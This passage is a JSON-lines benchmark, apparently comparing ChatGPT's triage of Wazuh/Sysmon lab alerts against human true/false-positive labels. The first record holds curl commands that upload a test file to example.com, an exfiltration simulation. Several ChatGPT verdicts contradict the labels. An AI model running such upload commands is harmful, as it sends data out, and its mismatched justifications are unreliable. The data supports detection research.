Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:47:39.261\r\nProcessGuid: {ff3427f9-4bfb-6868-1306-000000001400}\r\nProcessId: 3380\r\nImage: C:\\Windows\\System32\\curl.exe\r\nFileVersion: 8.13.0\r\nDescription: The curl executable\r\nProduct: The curl executable\r\nCompany: curl, https://curl.se/\r\nOriginalFileName: curl.exe\r\nCommandLine: C:\\Windows\\System32\\Curl.exe  --data c:\\temp\\atomictestfile.txt www.example.com\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F\r\nParentProcessGuid: {ff3427f9-4bfa-6868-0e06-000000001400}\r\nParentProcessId: 9660\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com & C:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com & C:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com & C:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:47:39.2639599Z", "eventRecordID": "391562", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 29, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665688.64158384", "timestamp": "2025-07-04T21:48:08.032+0000"}, "fields": {"timestamp": ["2025-07-04T21:48:08.032Z"]}, "sort": [1751665688032]}, "chatgpt_response": {"alert_id": "9Rdp15cB1Hp-jZ7fRbI5", "classification": "TP", "priority": "High", "justification": "This alert is a True Positive (TP) because it was triggered by Sysmon event ID 1 (process creation) for 'curl.exe' executing multiple command-line operations, matching the rule for suspicious Windows command shell execution (techniques T1059 and T1087). The process was executed with high integrity level, involved file hashes, and the command line shows potential data exfiltration or interaction with an external server (www.example.com). This behavior is suspicious and warrants immediate investigation. The priority is set to High due to the potential for data exfiltration or lateral movement."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "This alert is a True Positive (TP) because it was triggered by Sysmon event ID 1 (process creation) for 'curl.exe' executing multiple command-line operations, matching the rule for suspicious Windows command shell execution (techniques T1059 and T1087). The process was executed with high integrity level, involved file hashes, and the command line shows potential data exfiltration or interaction with an external server (www.example.com). This behavior is suspicious and warrants immediate investigation. The priority is set to High due to the potential for data exfiltration or lateral movement.", "classification_match": true, "priority_match": false}
{"id": "1UdWz5cBxOat6TbbGV0M", "description": "Printer spooler service loaded a dll file. Possible PrintNightmare exploit: CVE-2021-34527", "label": "FP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.03", "_id": "1UdWz5cBxOat6TbbGV0M", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "PRINTCONFIG.DLL", "image": "C:\\\\Windows\\\\System32\\\\spoolsv.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "signature": "Microsoft Windows", "imageLoaded": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\x64\\\\3\\\\PrintConfig.dll", "description": "PrintConfig User Interface", "signed": "true", "signatureStatus": "Valid", "processGuid": "{ff3427f9-3a64-6866-3e00-000000001200}", "processId": "3140", "utcTime": "2025-07-03 08:10:06.450", "hashes": "SHA1=B1B111F836AC95255E6386F14DFE54DB34CF531E,MD5=B10FF87F21C9C0BC13F998726189627A,SHA256=08A6880EBD2F05FBAF6DDBCB5A411C29A727B4B7F2236273D433FBEF77305A3E,IMPHASH=14075EFA04039861B61CC18035EF2F7A", "ruleName": "technique_id=1210,technique_name=Exploitation of Remote Services", "company": "Microsoft Corporation", "fileVersion": "10.0.26100.4343 (WinBuild.160101.0800)", "user": "NT AUTHORITY\\\\SYSTEM"}, "system": {"eventID": "7", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Image loaded:\r\nRuleName: technique_id=1210,technique_name=Exploitation of Remote Services\r\nUtcTime: 2025-07-03 08:10:06.450\r\nProcessGuid: {ff3427f9-3a64-6866-3e00-000000001200}\r\nProcessId: 3140\r\nImage: C:\\Windows\\System32\\spoolsv.exe\r\nImageLoaded: C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PrintConfig.dll\r\nFileVersion: 10.0.26100.4343 (WinBuild.160101.0800)\r\nDescription: PrintConfig User Interface\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PRINTCONFIG.DLL\r\nHashes: SHA1=B1B111F836AC95255E6386F14DFE54DB34CF531E,MD5=B10FF87F21C9C0BC13F998726189627A,SHA256=08A6880EBD2F05FBAF6DDBCB5A411C29A727B4B7F2236273D433FBEF77305A3E,IMPHASH=14075EFA04039861B61CC18035EF2F7A\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: NT AUTHORITY\\SYSTEM\"", "version": "3", "systemTime": "2025-07-03T08:10:06.5086940Z", "eventRecordID": "122447", "threadID": "4456", "computer": "Win11Client.soclab.internal", "task": "7", "processID": "3744", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Printer spooler service loaded a dll file. Possible PrintNightmare exploit: CVE-2021-34527", "groups": ["sysmon", "sysmon_eid7_detections", "windows"], "mitre": {"technique": ["Exploitation of Remote Services"], "id": ["T1210"], "tactic": ["Lateral Movement"]}, "id": "92152"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751530207.578233", "timestamp": "2025-07-03T08:10:07.580+0000"}, "fields": {"timestamp": ["2025-07-03T08:10:07.580Z"]}, "sort": [1751530207580]}, "chatgpt_response": {"alert_id": "1UdWz5cBxOat6TbbGV0M", "classification": "TP", "priority": "Critical", "justification": "The alert indicates that the Windows Printer Spooler service (spoolsv.exe) loaded a DLL (PrintConfig.dll) which is flagged as a possible PrintNightmare exploit (CVE-2021-34527). This is a known critical vulnerability allowing remote code execution via the print spooler service. The alert contains valid hashes, is detected by Sysmon, and matches a known exploit technique (T1210 - Exploitation of Remote Services). Immediate investigation and remediation are required."}, "chatgpt_classification": "TP", "chatgpt_priority": "Critical", "chatgpt_justification": "The alert indicates that the Windows Printer Spooler service (spoolsv.exe) loaded a DLL (PrintConfig.dll) which is flagged as a possible PrintNightmare exploit (CVE-2021-34527). This is a known critical vulnerability allowing remote code execution via the print spooler service. The alert contains valid hashes, is detected by Sysmon, and matches a known exploit technique (T1210 - Exploitation of Remote Services). Immediate investigation and remediation are required.", "classification_match": false, "priority_match": false}
{"id": "YEc91pcBxOat6TbbGseK", "description": "Powershell process has copied an executable file to Windows start-up folder", "label": "FP", "rule_level": 14, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "YEc91pcBxOat6TbbGseK", "_version": 1, "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.12", "name": "WinSrv2019", "id": "004"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "processGuid": "{6a97c67b-fd2a-6867-6802-000000000a00}", "processId": "2764", "utcTime": "2025-07-04 16:20:15.373", "targetFilename": "C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\mount_shares.bat", "creationUtcTime": "2025-07-04 16:20:15.373", "user": "SOCLAB\\\\vboxuser"}, "system": {"eventID": "11", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"File created:\r\nRuleName: -\r\nUtcTime: 2025-07-04 16:20:15.373\r\nProcessGuid: {6a97c67b-fd2a-6867-6802-000000000a00}\r\nProcessId: 2764\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\mount_shares.bat\r\nCreationUtcTime: 2025-07-04 16:20:15.373\r\nUser: SOCLAB\\vboxuser\"", "version": "2", "systemTime": "2025-07-04T16:20:15.379668300Z", "eventRecordID": "10563", "threadID": "2768", "computer": "WinSrv2019.soclab.internal", "task": "11", "processID": "1824", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": true, "description": "Powershell process has copied an executable file to Windows start-up folder", "groups": ["sysmon", "sysmon_eid11_detections", "windows"], "mitre": {"technique": ["Registry Run Keys / Startup Folder"], "id": ["T1547.001"], "tactic": ["Persistence", "Privilege Escalation"]}, "id": "92226"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751646015.47764303", "timestamp": "2025-07-04T16:20:15.768+0000"}, "fields": {"timestamp": ["2025-07-04T16:20:15.768Z"]}, "sort": [1751646015768]}, "chatgpt_response": {"alert_id": "YEc91pcBxOat6TbbGseK", "classification": "TP", "priority": "High", "justification": "This alert indicates that a PowerShell process executed by user 'SOCLAB\\vboxuser' created a new executable (mount_shares.bat) in the Windows Start-Up folder. This is a well-known persistence and potential privilege escalation technique (MITRE T1547.001). Such activity is suspicious and should be investigated immediately. The presence of a batch file in the Start-Up folder can lead to unauthorized persistence on the system. This is a clear security event that warrants high priority."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "This alert indicates that a PowerShell process executed by user 'SOCLAB\\vboxuser' created a new executable (mount_shares.bat) in the Windows Start-Up folder. This is a well-known persistence and potential privilege escalation technique (MITRE T1547.001). Such activity is suspicious and should be investigated immediately. The presence of a batch file in the Start-Up folder can lead to unauthorized persistence on the system. This is a clear security event that warrants high priority.", "classification_match": false, "priority_match": true}
{"id": "Ukdaz5cBxOat6TbbNF5u", "description": "Evidence of new service creation found in registry under HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\PrintWorkflowUserSvc_1d14aa\\\\ImagePath binary is: C:\\\\WINDOWS\\\\system32\\\\svchost.exe -k PrintWorkflow", "label": "FP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.03", "_id": "Ukdaz5cBxOat6TbbNF5u", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "C:\\\\WINDOWS\\\\system32\\\\services.exe", "targetObject": "HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\PrintWorkflowUserSvc_1d14aa\\\\ImagePath", "processGuid": "{ff3427f9-3a61-6866-0b00-000000001200}", "processId": "904", "utcTime": "2025-07-03 08:14:36.141", "details": "C:\\\\WINDOWS\\\\system32\\\\svchost.exe -k PrintWorkflow", "eventType": "SetValue", "user": "NT AUTHORITY\\\\SYSTEM"}, "system": {"eventID": "13", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2025-07-03 08:14:36.141\r\nProcessGuid: {ff3427f9-3a61-6866-0b00-000000001200}\r\nProcessId: 904\r\nImage: C:\\WINDOWS\\system32\\services.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\PrintWorkflowUserSvc_1d14aa\\ImagePath\r\nDetails: C:\\WINDOWS\\system32\\svchost.exe -k PrintWorkflow\r\nUser: NT AUTHORITY\\SYSTEM\"", "version": "2", "systemTime": "2025-07-03T08:14:36.3553437Z", "eventRecordID": "122860", "threadID": "4448", "computer": "Win11Client.soclab.internal", "task": "13", "processID": "3744", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 22, "mail": false, "description": "Evidence of new service creation found in registry under HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\PrintWorkflowUserSvc_1d14aa\\\\ImagePath binary is: C:\\\\WINDOWS\\\\system32\\\\svchost.exe -k PrintWorkflow", "groups": ["sysmon", "sysmon_eid13_detections", "windows"], "mitre": {"technique": ["Windows Service"], "id": ["T1543.003"], "tactic": ["Persistence", "Privilege Escalation"]}, "id": "92307"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751530480.1133380", "timestamp": "2025-07-03T08:14:40.946+0000"}, "fields": {"timestamp": ["2025-07-03T08:14:40.946Z"]}, "sort": [1751530480946]}, "chatgpt_response": {"alert_id": "Ukdaz5cBxOat6TbbNF5u", "classification": "TP", "priority": "High", "justification": "This alert is triggered by Sysmon event ID 13 (SetValue) indicating a new service was registered under HKLM\\System\\CurrentControlSet\\Services with the binary path pointing to svchost.exe with a non-standard service name and parameter. This is a known persistence and privilege escalation technique (MITRE T1543.003). The event involves SYSTEM user, a critical process (services.exe), and attempts to create a potentially malicious or suspicious service. This warrants high priority as it could indicate compromise or lateral movement."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "This alert is triggered by Sysmon event ID 13 (SetValue) indicating a new service was registered under HKLM\\System\\CurrentControlSet\\Services with the binary path pointing to svchost.exe with a non-standard service name and parameter. This is a known persistence and privilege escalation technique (MITRE T1543.003). The event involves SYSTEM user, a critical process (services.exe), and attempts to create a potentially malicious or suspicious service. This warrants high priority as it could indicate compromise or lateral movement.", "classification_match": false, "priority_match": false}
{"id": "NMeQu5cBD2WdxGkx8I_0", "description": "Executable file dropped in folder commonly used by malware", "label": "FP", "rule_level": 15, "rule_priority": "Critical", "alert": {"_index": "wazuh-alerts-4.x-2025.06.29", "_id": "NMeQu5cBD2WdxGkx8I_0", "_version": 1, "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "C:\\\\WINDOWS\\\\Explorer.EXE", "processGuid": "{ff3427f9-29bd-6861-f800-000000001000}", "processId": "5648", "utcTime": "2025-06-29 12:02:02.891", "targetFilename": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\eicar.exe", "creationUtcTime": "2025-06-29 12:02:02.889", "user": "SOCLAB\\\\snell"}, "system": {"eventID": "11", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"File created:\r\nRuleName: -\r\nUtcTime: 2025-06-29 12:02:02.891\r\nProcessGuid: {ff3427f9-29bd-6861-f800-000000001000}\r\nProcessId: 5648\r\nImage: C:\\WINDOWS\\Explorer.EXE\r\nTargetFilename: C:\\Users\\snell\\AppData\\Local\\Temp\\eicar.exe\r\nCreationUtcTime: 2025-06-29 12:02:02.889\r\nUser: SOCLAB\\snell\"", "version": "2", "systemTime": "2025-06-29T12:02:02.8918800Z", "eventRecordID": "109830", "threadID": "4536", "computer": "Win11Client.soclab.internal", "task": "11", "processID": "3828", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": true, "description": "Executable file dropped in folder commonly used by malware", "groups": ["sysmon", "sysmon_eid11_detections", "windows"], "mitre": {"technique": ["Ingress Tool Transfer"], "id": ["T1105"], "tactic": ["Command and Control"]}, "id": "92213"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751198524.21546883", "timestamp": "2025-06-29T12:02:04.160+0000"}, "fields": {"timestamp": ["2025-06-29T12:02:04.160Z"]}, "sort": [1751198524160]}, "chatgpt_response": {"alert_id": "NMeQu5cBD2WdxGkx8I_0", "classification": "TP (True Positive)", "priority": "High", "justification": "Sysmon Event ID 11 detected the creation of an executable ('eicar.exe', commonly used as a test for antivirus detection) in a user temp folder by explorer.exe. This matches a known tactic (T1105 - Ingress Tool Transfer) and is flagged by a rule designed to detect executable drops in commonly abused locations. Unless this is a known, authorized test, this is a legitimate security alert and should be treated as a high priority for investigation."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "Sysmon Event ID 11 detected the creation of an executable ('eicar.exe', commonly used as a test for antivirus detection) in a user temp folder by explorer.exe. This matches a known tactic (T1105 - Ingress Tool Transfer) and is flagged by a rule designed to detect executable drops in commonly abused locations. Unless this is a known, authorized test, this is a legitimate security alert and should be treated as a high priority for investigation.", "classification_match": false, "priority_match": false}
